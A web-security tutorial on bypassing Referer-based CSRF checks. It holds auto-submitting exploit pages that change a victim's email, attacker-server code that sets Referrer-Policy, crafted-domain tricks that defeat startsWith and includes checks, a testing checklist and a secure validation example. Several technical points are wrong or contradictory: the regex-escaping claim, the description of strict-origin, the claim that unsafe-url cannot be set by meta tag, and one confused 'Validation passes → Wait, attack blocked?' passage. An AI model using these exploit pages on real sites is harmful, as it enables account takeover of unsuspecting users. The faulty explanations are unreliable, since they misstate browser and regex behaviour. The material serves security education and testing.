# Bypassing Referer-Based CSRF Defences

Referer-based CSRF defence is an alternative (and generally weaker) approach used by some applications in place of, or in addition to, CSRF tokens, where the server inspects the HTTP Referer header of incoming requests to verify that they originated from the application's own domain rather than from a malicious third-party site. Unlike CSRF tokens which provide cryptographic proof of request legitimacy, Referer-based validation relies on a header that is optional, suppressible by the browser, frequently stripped by privacy tools and browser policies, and often validated with naive string-matching logic that attackers can trivially subvert through URL manipulation — making it one of the least reliable CSRF defences available and one that OWASP explicitly categorises as a supplementary control rather than a primary defence. Understanding how to test and bypass Referer-based defences is essential for any web security assessment because applications relying on them often appear protected against CSRF at first glance, but are in practice trivially exploitable through either complete header suppression or simple URL crafting techniques.

The central weakness: **the Referer header is attacker-influenced, browser-suppressible, and frequently absent in legitimate traffic — meaning any defence that relies solely on it is fundamentally fragile**.

## Understanding the Referer Header

### What is the Referer Header?

**Definition and origin:**

```
HTTP Referer header (note: intentionally misspelled in the HTTP spec — 
correct spelling is "Referrer" but the misspelling is now a permanent
feature of the HTTP standard):

Request header sent by browsers to indicate the URL of the page
that initiated the current request.

Added automatically when:
✓ User clicks a hyperlink on a page
✓ User submits an HTML form
✓ Browser loads a subresource (image, script, stylesheet)
✓ JavaScript triggers an XHR/fetch request
✓ Any browser-initiated request with a referencing document

Example:
User is on: https://example.com/account
User clicks a link to: https://example.com/change-email

Request sent:
GET /change-email HTTP/1.1
Host: example.com
Referer: https://example.com/account  ← Added automatically
Cookie: session=TOKEN
```

**Referer header in CSRF context:**

```
Legitimate form submission (same-site user action):
POST /my-account/change-email HTTP/1.1
Host: vulnerable.com
Referer: https://vulnerable.com/my-account     ← Points to own domain
Cookie: session=VICTIM_SESSION
Body: email=user@normal.com

CSRF attack from attacker's page:
POST /my-account/change-email HTTP/1.1
Host: vulnerable.com
Referer: https://attacker.com/csrf-exploit.html ← Points to attacker's domain
Cookie: session=VICTIM_SESSION
Body: email=attacker@evil.com

Application Referer validation intent:
"If Referer doesn't come from our domain → reject request"
```

### Why Referer validation is unreliable

**The Referer header is optional and frequently absent:**

```
Situations where browsers omit Referer header:
1. User types URL directly into address bar
2. User clicks a bookmark
3. Browser privacy settings strip it
4. Privacy-focused browser extensions (uBlock Origin, Privacy Badger)
5. HTTPS → HTTP transitions (security policy: never downgrade)
6. HTML pages with <meta name="referrer" content="no-referrer">
7. Links with rel="noreferrer" attribute
8. Referrer-Policy header set to no-referrer
9. Corporate proxies that strip headers
10. Some mobile browsers by default
11. Browser's reader mode
12. Requests from PDF viewers
13. Some email clients opening links

Result:
If application rejects ALL requests without Referer:
→ Breaks legitimate functionality for privacy-conscious users
→ Breaks requests from legitimate sources listed above

So most applications:
→ Only validate Referer WHEN PRESENT
→ Allow requests with missing Referer silently
→ Creates bypass!
```

**Referer-Policy header controls Referer behaviour:**

```http
Server can set Referrer-Policy to control what browsers send:

Referrer-Policy: no-referrer
→ Browser never sends Referer header

Referrer-Policy: no-referrer-when-downgrade (old default)
→ Send full URL except on HTTPS→HTTP transitions

Referrer-Policy: same-origin
→ Only send Referer for same-origin requests (cross-origin: omit)

Referrer-Policy: strict-origin
→ Send only origin (no path/query) for same-origin, omit for cross-origin

Referrer-Policy: strict-origin-when-cross-origin (modern default)
→ Full URL for same-origin; origin only for cross-origin; omit on downgrade

Referrer-Policy: unsafe-url
→ Always send full URL regardless of origin or protocol

Note:
Modern browsers default to strict-origin-when-cross-origin
This means cross-origin requests may only show the ORIGIN
not the full path — weakening even "correct" Referer validation
```

## Bypass 1: Validation Depends on Header Being Present

### The vulnerability

**Flawed conditional validation:**

```javascript
// VULNERABLE server-side validation logic
app.post('/my-account/change-email', (req, res) => {
    
    const referer = req.headers['referer'];
    
    // BUG: Only validates if Referer header exists
    if (referer) {
        // Only reaches here if Referer was present
        if (!referer.startsWith('https://vulnerable.com')) {
            return res.status(403).send('Request not from our domain');
        }
        // Referer present and valid: allowed
    }
    // No Referer header: silently falls through!
    
    updateEmail(req.user.id, req.body.email);
    res.redirect('/my-account');
});
```

**The logic flaw:**

```
Developer intent: "Validate that requests come from our domain"

Developer implementation: "IF Referer is present THEN validate it"

Attacker's insight: "What if I just... don't send a Referer?"

Test result:
- Referer: https://attacker.com → 403 Forbidden ✓ (blocked)
- Referer: https://vulnerable.com → 200 OK ✓ (allowed)
- No Referer header at all → 200 OK ✗ (also allowed — VULNERABLE!)

The defence only catches attackers who
"accidentally" include a revealing Referer header
```

### Suppressing the Referer header

**Method 1: Meta referrer tag (most reliable)**

```html
<!-- Place on attacker's exploit page -->
<meta name="referrer" content="never">

<!-- Other valid values:
content="no-referrer"         → No Referer sent
content="never"               → No Referer sent (legacy value)
content="none"                → No Referer sent (legacy value)
content="origin"              → Only origin sent (no path)
content="no-referrer-when-downgrade" → Default browser behavior
-->
```

**Complete exploit page:**

```html
<!DOCTYPE html>
<html>
<head>
    <!-- Instructs browser: send NO Referer header with any request from this page -->
    <meta name="referrer" content="never">
    <title>Amazing Prize!</title>
</head>
<body onload="document.forms[0].submit()">
    
    <!-- No Referer will be sent with this form submission -->
    <form action="https://vulnerable-website.com/my-account/change-email" 
          method="POST">
        <input type="hidden" name="email" value="attacker@evil-user.net">
    </form>
    
</body>
</html>
```

```
Request sent by victim's browser:
POST /my-account/change-email HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Cookie: session=VICTIM_SESSION_COOKIE

email=attacker@evil-user.net

(No Referer header — meta tag suppressed it)

Server validation:
referer = undefined
if (referer) → FALSE
→ Falls through validation
→ Processes request
→ Email changed!
```

**Method 2: Referrer-Policy response header from exploit page**

```http
HTTP/1.1 200 OK
Content-Type: text/html
Referrer-Policy: no-referrer

<!-- Page content with CSRF exploit -->
```

```javascript
// If attacker controls server delivering exploit:
app.get('/csrf-exploit', (req, res) => {
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.send(`
        <html>
        <body onload="document.forms[0].submit()">
        <form action="https://vulnerable.com/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>
        </body>
        </html>
    `);
});
```

**Method 3: Link with rel="noreferrer"**

```html
<!-- If attack uses a link rather than auto-submit: -->
<a href="https://vulnerable.com/change-email?email=attacker@evil.com" 
   rel="noreferrer">
   Click here
</a>

<!-- rel="noreferrer" tells browser: don't send Referer when this link followed -->
<!-- Useful for GET-based CSRF where endpoint accepts GET requests -->
```

**Method 4: JavaScript location redirect**

```javascript
// In some contexts, JavaScript navigation omits Referer
// (browser-dependent, less reliable than meta tag)
window.location = 'https://vulnerable.com/change-email?email=attacker@evil.com';

// More reliable with about:blank intermediate:
var w = window.open('about:blank');
w.document.write('<form action="https://vulnerable.com/change-email" method="POST">...');
// about:blank pages may not send Referer in some browsers
```

**Method 5: HTTPS to HTTP (scheme downgrade)**

```
If target uses HTTP (not HTTPS):
Referrer never sent from HTTPS pages to HTTP pages
(Browser security: don't leak secure origin to insecure destination)

Attack page: https://attacker.com/exploit
Target: http://vulnerable.com/change-email

Request:
POST http://vulnerable.com/change-email HTTP/1.1
(No Referer — HTTPS→HTTP transition)

Note: Less common as most applications now use HTTPS
```

### Testing for this bypass

```
Step 1: Identify Referer validation on POST endpoint
Send normal request from own browser:
POST /change-email
Referer: https://vulnerable.com/account
→ 200 OK (accepted)

Step 2: Send with wrong Referer
POST /change-email
Referer: https://attacker.com
→ 403 Forbidden (Referer validated!)

Step 3: Remove Referer header entirely (key test)
POST /change-email
(No Referer header)
→ 200 OK? = VULNERABLE (validation skipped when absent)
→ 403 Forbidden? = Not vulnerable this way (requires further testing)

In Burp Repeater:
Right-click on Referer header in request editor
Select "Delete header"
Send request
Observe response

Step 4: If vulnerable, construct exploit with meta referrer tag
<meta name="referrer" content="never">
```

## Bypass 2: Naive Referer Validation Logic

### Bypass A: Subdomain matching (startsWith)

**Vulnerable validation using startsWith:**

```javascript
// VULNERABLE: Checks if Referer STARTS WITH expected domain
app.post('/transfer', (req, res) => {
    const referer = req.headers['referer'] || '';
    
    // BUG: "starts with" check
    if (!referer.startsWith('https://vulnerable-website.com')) {
        return res.status(403).send('Invalid origin');
    }
    
    processTransfer(req.user.id, req.body.recipient, req.body.amount);
});
```

**Exploitation — attacker-controlled subdomain:**

```
Vulnerable validation logic:
referer.startsWith('https://vulnerable-website.com')

Bypass: Make Referer START WITH the target domain
Trick: Use target domain AS A SUBDOMAIN of attacker's domain

Malicious URL:
https://vulnerable-website.com.attacker-website.com/csrf-attack

Referer header sent:
Referer: https://vulnerable-website.com.attacker-website.com/csrf-attack

Validation check:
'https://vulnerable-website.com.attacker-website.com/csrf-attack'
.startsWith('https://vulnerable-website.com')
→ TRUE! (string genuinely starts with 'https://vulnerable-website.com')

Result: Validation passes! CSRF bypass successful.
```

**How to set up the attack domain:**

```
Attacker needs:
Domain: attacker-website.com

Create subdomain:
vulnerable-website.com.attacker-website.com

DNS: Add subdomain record
A record: vulnerable-website.com.attacker-website.com → attacker's server IP

Host exploit page at:
https://vulnerable-website.com.attacker-website.com/csrf-attack

When victim is directed to this URL:
Browser sends request to vulnerable-website.com with:
Referer: https://vulnerable-website.com.attacker-website.com/csrf-attack

Starts with https://vulnerable-website.com → validation passes!
```

**Exploit page:**

```html
<!-- Hosted at: https://vulnerable-website.com.attacker-website.com/csrf-attack -->
<!-- Referer will be: https://vulnerable-website.com.attacker-website.com/csrf-attack -->
<!-- Starts with: https://vulnerable-website.com ← Passes naive check! -->

<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
    <form action="https://vulnerable-website.com/my-account/change-email" 
          method="POST">
        <input type="hidden" name="email" value="attacker@evil-user.net">
    </form>
</body>
</html>
```

### Bypass B: Contains matching (includes)

**Vulnerable validation using string contains:**

```javascript
// VULNERABLE: Checks if Referer CONTAINS expected domain
app.post('/change-email', (req, res) => {
    const referer = req.headers['referer'] || '';
    
    // BUG: "contains" check — attacker can put domain anywhere in URL
    if (!referer.includes('vulnerable-website.com')) {
        return res.status(403).send('Invalid Referer');
    }
    
    updateEmail(req.user.id, req.body.email);
});
```

**Exploitation — embed target domain in URL:**

```
Vulnerable validation logic:
referer.includes('vulnerable-website.com')

Bypass: Put target domain ANYWHERE in the Referer URL
Trick: Include it as a query parameter in attacker's URL

Malicious URL:
https://attacker-website.com/csrf-attack?vulnerable-website.com

Referer header sent:
Referer: https://attacker-website.com/csrf-attack?vulnerable-website.com

Validation check:
'https://attacker-website.com/csrf-attack?vulnerable-website.com'
.includes('vulnerable-website.com')
→ TRUE! (string contains 'vulnerable-website.com' in query param)

Result: Validation passes! CSRF bypass successful.
```

**Exploit page:**

```html
<!-- Hosted at: https://attacker-website.com/csrf-attack?vulnerable-website.com -->
<!-- Referer will be: https://attacker-website.com/csrf-attack?vulnerable-website.com -->
<!-- Contains 'vulnerable-website.com' → passes naive check! -->

<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
    <form action="https://vulnerable-website.com/my-account/change-email" 
          method="POST">
        <input type="hidden" name="email" value="attacker@evil-user.net">
    </form>
</body>
</html>
```

**Additional placement options:**

```
Variations for contains() bypass:

As query parameter:
https://attacker.com/exploit?vulnerable-website.com

As path segment:
https://attacker.com/vulnerable-website.com/exploit

As subdomain (also bypasses startsWith):
https://vulnerable-website.com.attacker.com/exploit

As fragment (may be excluded from Referer — test):
https://attacker.com/exploit#vulnerable-website.com

As username (unusual but valid URL syntax):
https://vulnerable-website.com@attacker.com/exploit
(Some parsers extract host, others extract full string)
```

### The query string stripping problem

**Modern browser Referer truncation:**

```
Issue discovered during testing:
When testing manually in Burp with "contains" bypass:
→ Referer includes full URL with query string → bypass works in Burp

When testing in actual browser:
→ Referer may NOT include query string → bypass fails in real browsers

Why this happens:
Modern browsers apply strict-origin-when-cross-origin by default
This means for cross-origin requests, browsers send only the ORIGIN
not the full URL (no path, no query string)

Referer sent by modern browser for cross-origin POST:
Referer: https://attacker-website.com
(NOT: https://attacker-website.com/csrf-attack?vulnerable-website.com)

Result:
'https://attacker-website.com'.includes('vulnerable-website.com')
→ FALSE → Validation passes → Wait, attack blocked?

Lesson: Burp testing vs. real browser testing may differ significantly
for Referer-based attacks
```

**Solution: Referrer-Policy: unsafe-url**

```http
Fix: Set Referrer-Policy response header on exploit page to force
full URL including query string in Referer

Attacker's exploit server response:
HTTP/1.1 200 OK
Content-Type: text/html
Referrer-Policy: unsafe-url    ← Forces full URL including query string

<html>
<body onload="document.forms[0].submit()">
...
</body>
</html>
```

```javascript
// Attacker's server includes this header when serving exploit page
app.get('/csrf-attack', (req, res) => {
    
    // Force browser to include full URL in Referer (including query string)
    res.setHeader('Referrer-Policy', 'unsafe-url');
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <body onload="document.forms[0].submit()">
            <form action="https://vulnerable-website.com/change-email" 
                  method="POST">
                <input type="hidden" name="email" value="attacker@evil.com">
            </form>
        </body>
        </html>
    `);
});
```

```
Effect of Referrer-Policy: unsafe-url:
Browser normally (strict-origin-when-cross-origin):
Would send: Referer: https://attacker-website.com

With Referrer-Policy: unsafe-url on exploit page:
Overrides browser default
Sends: Referer: https://attacker-website.com/csrf-attack?vulnerable-website.com

Now 'contains' bypass works in real browser as well as Burp!

Note: Referrer (correct spelling) in policy header
      Referer (misspelling) in request header
      Different spellings for the same conceptual thing
```

**Complete exploit with Referrer-Policy fix:**

```html
<!-- Server must set Referrer-Policy: unsafe-url header in HTTP response -->
<!-- Cannot be set via meta tag — only HTTP header works for this -->

<!-- The served page: -->
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<!-- 
    HTTP response includes:
    Referrer-Policy: unsafe-url
    This forces full URL (including query string) in Referer
-->
<body onload="document.forms[0].submit()">
    <form action="https://vulnerable-website.com/my-account/change-email" 
          method="POST">
        <input type="hidden" name="email" value="attacker@evil-user.net">
    </form>
</body>
</html>
```

```
Full attack URL for "contains" bypass with unsafe-url:
Exploit hosted at: https://attacker-website.com/csrf-attack?vulnerable-website.com

Response includes: Referrer-Policy: unsafe-url

Browser sends request to vulnerable-website.com with:
Referer: https://attacker-website.com/csrf-attack?vulnerable-website.com

Validation: includes('vulnerable-website.com') → TRUE!
CSRF successful!
```

## Testing Referer Validation Comprehensively

### Systematic testing checklist

```
Step 1: Map Referer validation behavior

Test A: Normal request (correct Referer)
POST /change-email
Referer: https://vulnerable.com/account
Expected: 200 OK

Test B: Wrong Referer (different domain)
POST /change-email
Referer: https://attacker.com
Expected: 403 Forbidden (if validation active)

Test C: No Referer header (remove entirely)
POST /change-email
(No Referer header)
If 200 OK → Bypass 1 confirmed (validation skipped when absent)
If 403 → Validation required for all requests

Test D: Empty Referer value
POST /change-email
Referer:
(Empty value)
May behave differently from absent header in some implementations
```

```
Step 2: Test logic bypass (if Referer required)

Test E: startsWith bypass
POST /change-email
Referer: https://vulnerable.com.attacker.com/exploit
If 200 OK → startsWith bypass works

Test F: contains bypass
POST /change-email
Referer: https://attacker.com/exploit?vulnerable.com
If 200 OK → contains bypass works

Test G: endsWith bypass
POST /change-email
Referer: https://evil-vulnerable.com
(If validation checks endsWith)

Test H: Partial match variations
POST /change-email
Referer: https://attacker.com/vulnerable.com
POST /change-email
Referer: https://attacker.com#vulnerable.com
```

```
Step 3: Confirm in browser (not just Burp)

Issue: Burp sends exact Referer you specify
Browser may strip query string due to Referrer-Policy

Test in browser:
1. Host simple exploit page with query string bypass URL
2. Check actual Referer received by server (access logs / Burp Collaborator)
3. If query string stripped: Add Referrer-Policy: unsafe-url to response

Step 4: Construct full working PoC
Combine:
- Correct bypass technique (suppress or manipulate Referer)
- Referrer-Policy header if needed (unsafe-url for contains bypass)
- Social engineering delivery (phishing, malicious link)
```

### Validation patterns and their bypasses

```
Pattern 1: referer === 'https://vulnerable.com'
(Exact match)
Bypass: Only bypassable by suppressing Referer entirely
(No manipulation possible — exact match required)

Pattern 2: referer.startsWith('https://vulnerable.com')
Bypass: https://vulnerable.com.attacker.com/exploit

Pattern 3: referer.includes('vulnerable.com')
Bypass: https://attacker.com/exploit?vulnerable.com
(May need Referrer-Policy: unsafe-url in browser)

Pattern 4: referer.endsWith('vulnerable.com')
Bypass: https://evil-vulnerable.com

Pattern 5: referer matches regex /vulnerable\.com/
Bypass: https://attacker.com/vulnerable.com/exploit
(Dot not escaped — vulnerable.com matches ANY char + com)
Better: https://attacker.com/vulnerableXcom/exploit → may match

Pattern 6: parsed URL hostname === 'vulnerable.com'
(Correct URL parsing)
Much harder to bypass — no simple string manipulation
Still bypassable by Referer suppression (header absent)
```

## Why Referer Validation Fails as a Primary Defence

### Fundamental limitations

**Summary of why Referer is unreliable:**

```
Problem 1: Header can be absent for legitimate reasons
Corporate proxies, privacy extensions, bookmarks, direct URL entry,
all generate requests with no Referer. Application cannot reject
ALL headerless requests without breaking real users.

Problem 2: Header can be suppressed by attacker
<meta name="referrer" content="never"> trivially strips it
Any legitimate suppression mechanism = attacker bypass vector

Problem 3: Header value is attacker-influenced
While attacker cannot forge arbitrary same-site Referers,
they can choose which URL their exploit is hosted at
to satisfy naive string-matching validation logic.

Problem 4: Browser Referer policies change over time
Modern browser defaults strip paths and query strings
cross-origin → validation based on path/query becomes unreliable
for legitimate requests too

Problem 5: Privacy tools and regulations
GDPR compliance, browsers adding privacy protections
= increasing Referer stripping = validation increasingly broken
for legitimate users

Problem 6: Server-side Referer forgery
(From within same-origin context via XSS)
XSS on same origin can make fetch() requests with arbitrary headers
(Custom code running same-origin has full control over Referer via
fetch() with referrer option)

OWASP consensus:
Referer validation = supplementary defence only
Never rely on it as the sole CSRF protection mechanism
```

**Comparison with CSRF tokens:**

```
CSRF Tokens:
✓ Cryptographically random, unpredictable
✓ Cannot be suppressed (must be in request body/header)
✓ Tied to specific user session
✓ Not affected by browser privacy changes
✓ Cannot be manipulated by URL crafting
✓ Standard, well-understood defence

Referer Validation:
✗ Header is optional, regularly absent in legitimate traffic
✗ Can be suppressed by attacker with <meta> tag
✗ Value partially controlled by attacker (URL they host at)
✗ Affected by browser Referrer-Policy changes
✗ Naive implementations bypassable by URL manipulation
✗ Query string stripping complicates testing
✓ No server-side state required
✓ Zero application code for basic implementation
```

## Secure Referer-Based Validation (If Must Be Used)

### Correct implementation as supplementary check

```javascript
// If Referer validation is used alongside CSRF tokens:

function validateReferer(req) {
    const referer = req.headers['referer'];
    
    // SECURE: Require Referer header to be present
    if (!referer) {
        return false;  // Reject requests with no Referer
        // Note: This breaks some legitimate use cases
        // Trade-off must be evaluated per application
    }
    
    // SECURE: Parse as URL and check hostname specifically
    try {
        const refererUrl = new URL(referer);
        const allowedHostname = 'vulnerable.com';
        
        // Check exact hostname match (not contains/startsWith)
        if (refererUrl.hostname !== allowedHostname &&
            !refererUrl.hostname.endsWith('.' + allowedHostname)) {
            return false;
        }
        
        // SECURE: Check scheme (HTTPS only)
        if (refererUrl.protocol !== 'https:') {
            return false;
        }
        
        return true;
        
    } catch (e) {
        // Invalid URL in Referer = reject
        return false;
    }
}

app.post('/change-email', (req, res) => {
    // Primary defence: CSRF token
    if (req.body.csrf_token !== req.session.csrfToken) {
        return res.status(403).send('Invalid CSRF token');
    }
    
    // Supplementary defence: Referer check
    if (!validateReferer(req)) {
        return res.status(403).send('Invalid Referer');
    }
    
    updateEmail(req.user.id, req.body.email);
});
```

**Correct URL parsing (not string matching):**

```javascript
// INSECURE patterns to avoid:

// 1. startsWith - vulnerable to subdomain attack
if (!referer.startsWith('https://vulnerable.com')) → VULNERABLE

// 2. includes/contains - vulnerable to query string attack
if (!referer.includes('vulnerable.com')) → VULNERABLE

// 3. Regex without anchors
if (!/vulnerable\.com/.test(referer)) → VULNERABLE
// 'vulnerable.com' regex matches 'vulnerableXcom' too (. = any char)

// 4. Case-sensitive only
if (!referer.startsWith('https://Vulnerable.COM')) → VULNERABLE
// Hostnames are case-insensitive

// SECURE: Parse URL then compare hostname property
const url = new URL(referer);
if (url.hostname !== 'vulnerable.com') → CORRECT
// new URL() properly parses the URL structure
// .hostname returns only the hostname (not path, query, fragment)
// Cannot be tricked by subdomain injection or query string tricks

// Even with correct parsing: still bypassable by Referer suppression!
// Always combine with CSRF tokens as primary defence
```
